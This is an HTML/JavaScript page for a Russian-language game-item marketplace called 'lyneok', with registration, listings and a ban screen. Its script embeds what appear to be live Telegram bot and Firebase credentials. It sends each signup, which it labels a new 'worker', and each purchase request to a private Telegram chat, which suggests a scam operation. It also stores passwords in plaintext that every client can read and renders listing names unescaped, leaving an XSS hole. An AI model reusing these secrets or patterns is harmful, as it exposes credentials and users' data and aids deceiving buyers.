<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>lyneok | Access</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700;900&display=swap');
        * { -webkit-tap-highlight-color: transparent; outline: none; box-sizing: border-box; }
        body { background: #07070a; color: #fff; font-family: 'Inter', sans-serif; overflow: hidden; margin: 0; }
        ::-webkit-scrollbar { display: none; }
        
        /* Дизайн регистрации как на фото */
        #auth_screen { background: radial-gradient(circle at top, #1e3a8a 0%, #07070a 70%); }
        .auth-card { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 40px; padding: 40px 30px; width: 90%; max-width: 380px; }
        .auth-input { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 18px; width: 100%; color: #fff; margin-bottom: 12px; font-size: 15px; }
        .auth-btn { background: #3b82f6; border-radius: 25px; padding: 20px; font-weight: 800; width: 100%; text-transform: uppercase; letter-spacing: 1px; box-shadow: 0 10px 30px rgba(59,130,246,0.3); }

        .glass { background: #121218; border: 1px solid rgba(255,255,255,0.03); border-radius: 20px; }
        .tab { display: none; height: 100vh; overflow-y: auto; padding-bottom: 100px; }
        .tab.active { display: block; }
        .nav-bar { position: fixed; bottom: 0; left: 0; right: 0; height: 75px; background: rgba(7,7,10,0.98); border-top: 1px solid #1f1f2e; display: flex; justify-content: space-around; align-items: center; z-index: 1000; }
        .nav-btn { color: #52525b; font-size: 20px; transition: 0.3s; }
        .nav-btn.active { color: #3b82f6; }
        
        .game-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; }
        .game-item { display: flex; flex-direction: column; align-items: center; text-align: center; }
        .game-icon { width: 100%; aspect-ratio: 1; border-radius: 15px; display: flex; justify-content: center; align-items: center; overflow: hidden; }
        
        #ban_screen { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; }
    </style>
</head>
<body>

    <div id="auth_screen" class="fixed inset-0 z-[5000] flex flex-col items-center justify-center hidden">
        <div class="auth-card text-center">
            <div class="w-16 h-16 bg-blue-600 rounded-2xl mx-auto flex items-center justify-center mb-6 shadow-xl">
                <i class="fa-solid fa-shield-halved text-white text-3xl"></i>
            </div>
            <h1 class="text-3xl font-black italic mb-1">lyneok<span class="text-blue-400">:access</span></h1>
            <p class="text-[10px] text-zinc-500 uppercase font-bold tracking-[3px] mb-8">вход в систему управления</p>
            
            <input id="reg_n" class="auth-input" placeholder="Никнейм">
            <input id="reg_tg" class="auth-input" placeholder="@username_tg">
            <input id="reg_p" type="password" class="auth-input" placeholder="Пароль">
            
            <button onclick="register()" class="auth-btn mt-4 text-sm">Начать работу</button>
        </div>
        <p class="text-[9px] text-zinc-600 font-bold uppercase tracking-widest mt-10 italic">v3.1 encrypted connection</p>
    </div>

    <div id="ban_screen" class="hidden">
        <i class="fa-solid fa-lock text-red-500 text-6xl mb-6"></i>
        <h2 class="text-2xl font-black uppercase">Доступ ограничен</h2>
        <div id="ban_timer" class="text-4xl font-black text-red-500 mt-4">00:00</div>
    </div>

    <div id="main_app" class="hidden">
        <header class="px-5 py-4 flex justify-between items-center sticky top-0 bg-[#07070a] z-50">
            <h1 class="text-xl font-black italic">lyne<span class="text-blue-500">ok</span></h1>
            <div onclick="setTab('profile')" class="bg-[#1a1a24] px-4 py-2 rounded-xl text-xs font-bold border border-white/5">
                <i class="fa-solid fa-wallet text-blue-500 mr-2"></i><span id="top_bal">0</span> ₽
            </div>
        </header>

        <main id="home" class="tab active px-5 pt-4">
            <div class="relative mb-6">
                <input class="input-p bg-[#121218] border border-white/5 w-full p-4 rounded-2xl pl-12 text-sm" placeholder="Поиск игр и приложений">
                <i class="fa-solid fa-search absolute left-5 top-4.5 text-zinc-500"></i>
            </div>
            
            <div class="flex justify-between items-center mb-4"><h2 class="font-bold">Игры и приложения</h2><span class="text-xs text-zinc-500">Все 850+</span></div>
            <div class="game-grid mb-8">
                <div class="game-item"><div class="game-icon bg-blue-600"><i class="fa-brands fa-steam text-2xl"></i></div><p class="text-[10px] mt-2 font-bold">Steam</p></div>
                <div class="game-item"><div class="game-icon bg-sky-500"><i class="fa-brands fa-telegram text-2xl"></i></div><p class="text-[10px] mt-2 font-bold">Telegram</p></div>
                <div class="game-item"><div class="game-icon bg-orange-500"><i class="fa-solid fa-ghost text-2xl"></i></div><p class="text-[10px] mt-2 font-bold">Brawl Stars</p></div>
                <div class="game-item"><div class="game-icon bg-zinc-700"><i class="fa-solid fa-cube text-2xl"></i></div><p class="text-[10px] mt-2 font-bold">Roblox</p></div>
            </div>
            <div id="feed_items" class="space-y-3"></div>
        </main>

        <main id="sell" class="tab px-5 pt-4">
            <div class="glass p-6 space-y-4 text-center">
                <h2 class="font-black text-lg uppercase">Выставить товар</h2>
                <input id="s_g" class="auth-input !bg-[#07070a]" placeholder="Игра">
                <input id="s_n" class="auth-input !bg-[#07070a]" placeholder="Название лота">
                <input id="s_p" type="number" class="auth-input !bg-[#07070a]" placeholder="Цена ₽">
                <button onclick="addLot()" class="auth-btn !py-4 text-xs">Опубликовать</button>
            </div>
        </main>

        <main id="profile" class="tab px-5 pt-4">
            <div class="glass p-8 text-center space-y-4">
                <div class="w-20 h-20 bg-blue-600 rounded-full mx-auto flex items-center justify-center text-3xl font-black" id="p_ava">?</div>
                <h3 class="text-xl font-bold" id="p_name">User</h3>
                <div class="flex justify-center gap-1 text-amber-400" id="stars"></div>
                <div class="grid grid-cols-2 gap-2 mt-4">
                    <div class="bg-[#07070a] p-4 rounded-2xl"><b id="p_sls">0</b><p class="text-[10px] opacity-40 uppercase">Продаж</p></div>
                    <div class="bg-[#07070a] p-4 rounded-2xl"><b id="p_bal">0</b><p class="text-[10px] opacity-40 uppercase">Баланс ₽</p></div>
                </div>
            </div>
        </main>

        <nav class="nav-bar">
            <div onclick="setTab('home')" id="n_home" class="nav-btn active"><i class="fa-solid fa-shop"></i></div>
            <div onclick="setTab('sell')" id="n_sell" class="nav-btn"><i class="fa-solid fa-plus-circle text-3xl"></i></div>
            <div onclick="setTab('profile')" id="n_profile" class="nav-btn"><i class="fa-solid fa-user"></i></div>
        </nav>
    </div>

    <script>
        const BOT = "8641257792:AAEsxnQWEIeozMt_gnSwJdVgSFQlOc-hnuc", AID = "7040863301";
        const CFG = { apiKey: "AIzaSyAY96OYOpqFgCI-Bxtt0Q3xj1BtzdnmWMI", databaseURL: "https://dogx-base-default-rtdb.firebaseio.com" };
        firebase.initializeApp(CFG); const dbR = firebase.database().ref('lyneok_v3_1');

        let me = null, db = {};

        function init() {
            dbR.on('value', snap => {
                db = snap.val() || {u:{}, i:{}};
                const id = localStorage.getItem('lyne_id');
                if(!id) {
                    document.getElementById('auth_screen').classList.remove('hidden');
                } else {
                    me = db.u[id];
                    if(me) {
                        document.getElementById('auth_screen').classList.add('hidden');
                        document.getElementById('main_app').classList.remove('hidden');
                        checkBan(); render();
                    } else { localStorage.removeItem('lyne_id'); location.reload(); }
                }
            });
        }

        async function register() {
            const n = document.getElementById('reg_n').value, t = document.getElementById('reg_tg').value, p = document.getElementById('reg_p').value;
            if(!n || !t || !p) return Swal.fire('Ой', 'Заполни все поля', 'error');
            const id = 'u' + Date.now();
            await dbR.child(`u/${id}`).set({id, n, tg:t, pass:p, bal:0, ban:0, sls:0, rev:0});
            localStorage.setItem('lyne_id', id);
            tg(`🆕 НОВЫЙ ВОРКЕР: ${n} (${t})`);
        }

        function checkBan() {
            if(!me) return;
            const screen = document.getElementById('ban_screen');
            if(me.ban && me.ban > Date.now()) {
                screen.classList.remove('hidden');
                let left = Math.ceil((me.ban - Date.now())/1000);
                document.getElementById('ban_timer').innerText = `${Math.floor(left/60)}:${(left%60).toString().padStart(2,'0')}`;
            } else { screen.classList.add('hidden'); }
        }

        function render() {
            document.getElementById('top_bal').innerText = me.bal;
            document.getElementById('p_bal').innerText = me.bal;
            document.getElementById('p_name').innerText = me.n;
            document.getElementById('p_ava').innerText = me.n[0].toUpperCase();
            document.getElementById('p_sls').innerText = me.sls;
            document.getElementById('stars').innerHTML = '<i class="fa-solid fa-star text-[10px]"></i>'.repeat(5);

            const items = Object.values(db.i || {}).reverse();
            document.getElementById('feed_items').innerHTML = items.map(i => `
                <div class="glass p-4 flex justify-between items-center">
                    <div><p class="text-[9px] text-blue-500 font-bold uppercase">${i.g}</p><h3 class="font-bold text-sm">${i.n}</h3></div>
                    <div class="text-right"><b class="text-blue-500">${i.p} ₽</b><br><button onclick="buy('${i.id}')" class="text-[9px] bg-blue-600/20 text-blue-500 px-3 py-1 rounded-lg mt-1">КУПИТЬ</button></div>
                </div>`).join('');
        }

        async function addLot() {
            const g=document.getElementById('s_g').value, n=document.getElementById('s_n').value, p=Number(document.getElementById('s_p').value);
            if(p<1) return;
            await dbR.child(`i/lot${Date.now()}`).set({id:'lot'+Date.now(), g, n, p, s:me.id});
            setTab('home');
        }

        function buy(id) { Swal.fire('Покупка', 'Заявка отправлена админу', 'info'); tg(`💳 ПОКУПКА: ${db.i[id].n} от ${me.n}`); }

        function setTab(t) {
            document.querySelectorAll('.tab').forEach(x=>x.classList.remove('active'));
            document.getElementById(t).classList.add('active');
            document.querySelectorAll('.nav-btn').forEach(x=>x.classList.remove('active'));
            document.getElementById('n_'+t).classList.add('active');
        }

        async function tg(txt) { fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:AID, text:txt})}); }

        setInterval(checkBan, 1000); init();
    </script>
</body>
</html>
